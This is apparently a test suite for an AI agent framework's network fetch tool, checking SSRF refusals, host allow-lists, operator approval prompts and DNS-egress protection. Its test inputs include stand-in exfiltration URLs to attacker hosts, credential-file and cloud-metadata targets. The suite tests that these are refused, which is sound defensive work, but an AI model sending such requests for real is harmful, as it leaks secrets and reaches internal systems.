# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Eric Lesiuta
"""`fetch`: the one way a worker with no network reads a URL.

It is an egress channel a model drives, so every check here is a default-deny and the operator's
allow-list is what makes a read silent.
"""

from __future__ import annotations

import gzip
import socket
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx2
import pytest

from agent6.config import Config
from agent6.kinds import IsolationLevel
from agent6.tools.dispatch import ToolDeniedError, ToolDispatcher, ToolError
from agent6.tools.fetch import MAX_BYTES, FetchRefusedError, check_url, fetch, host_allowed
from agent6.tools.operator_prompts import ApprovalAnswer, ApprovalRequest, OperatorPrompts


class _Body(httpx2.SyncByteStream):
    """A streamed response body, fresh per response."""

    def __init__(self, data: bytes) -> None:
        self._data = data

    def __iter__(self) -> Iterator[bytes]:
        yield self._data


def _fetch_serving(
    monkeypatch: pytest.MonkeyPatch, *, headers: dict[str, str], content: bytes
) -> None:
    """Point `fetch` at an in-memory server answering one GET on a name that resolves public."""
    from agent6.tools import fetch as fetch_mod

    def _public(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
        return [(0, 0, 0, "", ("93.184.216.34", 443))]

    monkeypatch.setattr(socket, "getaddrinfo", _public)

    def _handler(_request: httpx2.Request) -> httpx2.Response:
        return httpx2.Response(200, headers=headers, stream=_Body(content))

    real_client = httpx2.Client

    def _client(**kwargs: Any) -> httpx2.Client:
        return real_client(transport=httpx2.MockTransport(_handler), **kwargs)

    monkeypatch.setattr(fetch_mod.httpx2, "Client", _client)


@pytest.mark.parametrize(
    "url",
    [
        "http://docs.python.org/3/",  # plaintext: a MITM would feed the model
        "file:///etc/passwd",
        "ftp://example.com/x",
        "/etc/passwd",
        "https:///nohost",
        # urlsplit itself refuses this one; the catch-all relabelled it "failed:", unlike a refusal.
        "https://[::1",
    ],
)
def test_only_https_with_a_host_is_fetched(url: str) -> None:
    with pytest.raises(FetchRefusedError):
        check_url(url)


@pytest.mark.parametrize(
    "host",
    [
        "127.0.0.1",  # a loopback admin port
        "169.254.169.254",  # the cloud metadata endpoint
        "10.0.0.1",
        "192.168.1.1",
        "[::1]",
    ],
)
def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None:
    """A literal address is refused before anyone is asked: SSRF is the whole threat."""
    with pytest.raises(FetchRefusedError, match="not a public address"):
        check_url(f"https://{host}/x")


def test_a_name_resolving_off_the_public_internet_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A name resolves only inside `fetch`, behind the gate; a non-public answer is refused."""

    def _local(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
        return [(0, 0, 0, "", ("127.0.0.1", 443))]

    monkeypatch.setattr(socket, "getaddrinfo", _local)
    with pytest.raises(FetchRefusedError, match="not a public address"):
        fetch(check_url("https://localhost/x"))


@pytest.mark.parametrize(
    ("host", "allowed", "expected"),
    [
        ("docs.python.org", ("docs.python.org",), True),
        ("DOCS.python.ORG", ("docs.python.org",), True),  # case-folded
        ("evil.com", ("docs.python.org",), False),
        ("x.readthedocs.io", (".readthedocs.io",), True),  # a leading dot allows subdomains
        ("readthedocs.io", (".readthedocs.io",), True),
        ("notreadthedocs.io", (".readthedocs.io",), False),  # ...and only subdomains
        ("anything.example", ("*",), True),
        ("anything.example", (), False),  # empty means NONE, never everything
    ],
)
def test_the_allow_list_matches_hosts_not_prefixes(
    host: str, allowed: tuple[str, ...], expected: bool
) -> None:
    """A URL-prefix match would let `evil.com/docs.python.org` through."""
    assert host_allowed(host, allowed) is expected


def test_a_host_the_operator_never_named_is_asked_about(tmp_path: Path) -> None:
    """The list is the standing approval; a host off it is the operator's call.

    The ask shows the parsed host plus the full path and query (a GET's exfil channel), never the
    raw URL.
    """
    asked: list[str] = []

    def _deny(request: ApprovalRequest, /) -> ApprovalAnswer:
        asked.append(request.prompt)
        return ApprovalAnswer(False, "stdin")

    d = ToolDispatcher(root=tmp_path, config=Config(), prompts=OperatorPrompts(approver=_deny))
    with pytest.raises(ToolDeniedError, match="fetch not approved"):
        d.dispatch("fetch", {"url": "https://example.com/x?k=v"})
    assert asked == ["Allow fetch: example.com /x?k=v"]


def test_an_allowed_host_is_never_prompted_for(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from agent6.tools import dispatch as dispatch_mod
    from agent6.tools.fetch import Checked, Fetched

    def _loud(_request: ApprovalRequest, /) -> ApprovalAnswer:
        return pytest.fail("an allowed host must not prompt")

    def _fetched(checked: Checked) -> Fetched:
        return Fetched(url=checked.url, status=200, content_type="text/plain", body="hello")

    monkeypatch.setattr(dispatch_mod, "fetch", _fetched)
    cfg = Config.model_validate({"sandbox": {"fetch_hosts": ["example.com"]}})
    d = ToolDispatcher(root=tmp_path, config=cfg, prompts=OperatorPrompts(approver=_loud))
    assert d.dispatch("fetch", {"url": "https://example.com/x"}).to_wire()["body"] == "hello"


def test_the_tool_is_hidden_when_commands_already_have_the_network(tmp_path: Path) -> None:
    """With `sandbox.network = "host"` the worker can run curl, so `fetch` is not offered."""
    blocked = ToolDispatcher(root=tmp_path, config=Config())
    allowed = ToolDispatcher(
        root=tmp_path, config=Config.model_validate({"sandbox": {"network": "host"}})
    )
    assert "fetch" in blocked.available_tool_names()
    assert "fetch" not in allowed.available_tool_names()


def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
    """Userinfo in a URL is refused: `@` chooses a credential and hides the real host."""
    with pytest.raises(FetchRefusedError, match="credentials"):
        check_url("https://docs.python.org@evil.example/exfil?k=SECRET")


def test_the_approval_prompt_shows_the_full_path_and_query() -> None:
    """The consent line carries the full path and query, a GET's exfiltration channel."""
    secret = "SECRET_EXFIL_TOKEN"
    long_path = "/" + "p" * 300
    prompt = check_url(f"https://example.com{long_path}?leak={secret}").prompt()
    assert secret in prompt, "the query string is the exfil channel; it must be shown"
    assert long_path in prompt, "a clipped path hides where the GET really goes"


def test_allowing_every_command_does_not_allow_the_network(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An "s" answered at a run_command prompt never auto-approves later fetches."""
    from agent6.events import EventSink
    from agent6.sessions.ipc import COMMAND_SCOPE, set_away_mode, set_session_allow
    from agent6.tools.operator_prompts import OperatorPrompts
    from agent6.ui.cli._interact import build_approver

    session_dir = tmp_path / "run"
    (session_dir / "approvals").mkdir(parents=True)
    set_session_allow(session_dir, COMMAND_SCOPE)
    approve = OperatorPrompts(
        approver=build_approver(session_dir),
        journal=EventSink(session_dir / "logs.jsonl").emit,
        session_dir=session_dir,
    ).approve

    assert approve("Allow run_command: ls", scope=COMMAND_SCOPE) is True
    # away-mode deny, so the opted-out call refuses instead of polling for a front-end.
    set_away_mode(session_dir, "deny")
    assert approve("Allow fetch: evil.example /x") is False


def test_answering_allow_all_on_a_fetch_prompt_allows_no_commands(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An "a" typed at a fetch prompt grants nothing: the asking side decides what it means."""
    from agent6.events import EventSink
    from agent6.sessions.ipc import COMMAND_SCOPE, session_allow_set
    from agent6.tools.operator_prompts import OperatorPrompts
    from agent6.ui.cli import _interact as interactmod

    session_dir = tmp_path / "run"
    (session_dir / "approvals").mkdir(parents=True)
    shown: list[str] = []

    def _typed(prompt: str, **_kw: object) -> str:
        shown.append(prompt)
        return "a"  # "allow all", on a prompt that offers no such thing

    monkeypatch.setattr(interactmod, "has_controlling_tty", lambda: True)
    monkeypatch.setattr(interactmod, "tty_prompt", _typed)
    approve = OperatorPrompts(
        approver=interactmod.build_approver(session_dir),
        journal=EventSink(session_dir / "logs.jsonl").emit,
        session_dir=session_dir,
    ).approve

    approve("Allow fetch: evil.example /x")
    assert not session_allow_set(session_dir, COMMAND_SCOPE)
    # The prompt never offered it: an "allow all" covering one call would lie about itself.
    approve("Allow run_command: ls", scope=COMMAND_SCOPE)
    assert "[y/N]" in shown[0] and "allow all" not in shown[0]
    assert "allow all" in shown[1]


def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
    """Every hiding rule has a matching refusal in dispatch, so exposure and enforcement agree."""
    cfg = Config.model_validate({"sandbox": {"network": "host"}})
    d = ToolDispatcher(root=tmp_path, config=cfg)
    assert "fetch" not in d.available_tool_names()
    with pytest.raises(ToolError, match="not available"):
        d.dispatch("fetch", {"url": "https://example.com/x"})


@pytest.mark.parametrize("isolation", ["hardened", "none"])
def test_fetch_is_hidden_wherever_a_command_reaches_the_network(
    tmp_path: Path, isolation: IsolationLevel
) -> None:
    """The rule reads the resolved isolation: only strict has network namespaces."""
    d = ToolDispatcher(
        root=tmp_path,
        config=Config.model_validate({"sandbox": {"network": "auto"}}),
        isolation=isolation,
    )
    assert "fetch" not in d.available_tool_names()
    with pytest.raises(ToolError, match="not available"):
        d.dispatch("fetch", {"url": "https://example.com/x"})


def test_a_plain_text_response_streams_back(monkeypatch: pytest.MonkeyPatch) -> None:
    _fetch_serving(monkeypatch, headers={"content-type": "text/plain"}, content=b"hello")
    got = fetch(check_url("https://example.com/x"))
    assert (got.status, got.body) == (200, "hello")


def test_a_compressed_response_is_refused_not_decoded(monkeypatch: pytest.MonkeyPatch) -> None:
    """A `Content-Encoding` other than identity is refused, never decoded.

    Httpx picks its decoder from the response header, so a hostile body expands before the size cap
    counts it (8 KiB of zstd measured out at 256 MiB in one chunk).
    """
    _fetch_serving(
        monkeypatch,
        headers={"content-type": "text/plain", "content-encoding": "gzip"},
        content=gzip.compress(b"a" * 4096),
    )
    with pytest.raises(FetchRefusedError, match="content-encoding"):
        fetch(check_url("https://example.com/x"))


def test_an_oversized_body_is_refused_while_it_arrives(monkeypatch: pytest.MonkeyPatch) -> None:
    _fetch_serving(
        monkeypatch, headers={"content-type": "text/plain"}, content=b"x" * (MAX_BYTES + 1)
    )
    with pytest.raises(FetchRefusedError, match="larger than"):
        fetch(check_url("https://example.com/x"))


def test_a_denied_fetch_never_touches_the_resolver(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A URL's host is not resolved before the gate approves the fetch.

    A DNS query for `<data>.attacker.example` delivers its label to that name's server: an egress
    channel no allow-list ever saw.
    """
    resolved: list[object] = []

    def _spy(*args: object, **kwargs: object) -> list[object]:
        resolved.append(args)
        raise OSError("the resolver must not be reached")

    monkeypatch.setattr(socket, "getaddrinfo", _spy)

    def _deny(_request: ApprovalRequest, /) -> ApprovalAnswer:
        return ApprovalAnswer(False, "stdin")

    d = ToolDispatcher(root=tmp_path, config=Config(), prompts=OperatorPrompts(approver=_deny))
    with pytest.raises(ToolDeniedError, match="fetch not approved"):
        d.dispatch("fetch", {"url": "https://payload.exfil.attacker.example/x"})
    assert resolved == []


def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
    """`fetch` answers about its input; a page it fetched is not the operator's deliverable."""
    from agent6.tools.schema import mode_tools

    assert "fetch" in mode_tools("run").names
    assert "fetch" in mode_tools("ask").names
    assert "fetch" not in mode_tools("machine").names
    assert "fetch" not in mode_tools("agent").names


def test_a_port_out_of_range_is_a_fetch_refusal_and_a_note_needs_a_30x() -> None:
    """`check_url` refuses an out-of-range port, and the redirect note rides only on a redirect."""
    from agent6.tools.fetch import FetchRefusedError, check_url
    from agent6.tools.results import FetchResult

    with pytest.raises(FetchRefusedError, match="cannot be read"):
        check_url("https://example.com:99999/x")
    created = FetchResult(
        url="https://x", status=201, content_type="text/plain", body="", location="/new"
    )
    assert "note" not in created.to_wire() and "location" not in created.to_wire()
    moved = FetchResult(
        url="https://x", status=302, content_type="text/plain", body="", location="/new"
    )
    assert "redirects are not followed" in moved.to_wire()["note"]


def test_the_approval_line_names_a_port_other_than_443() -> None:
    """The consent line names the port: the operator consents to `h.example:8443`, not to a host."""
    from agent6.tools.fetch import check_url

    assert check_url("https://h.example:8443/admin").prompt() == "h.example:8443 /admin"
    assert check_url("https://h.example/admin").prompt() == "h.example /admin"
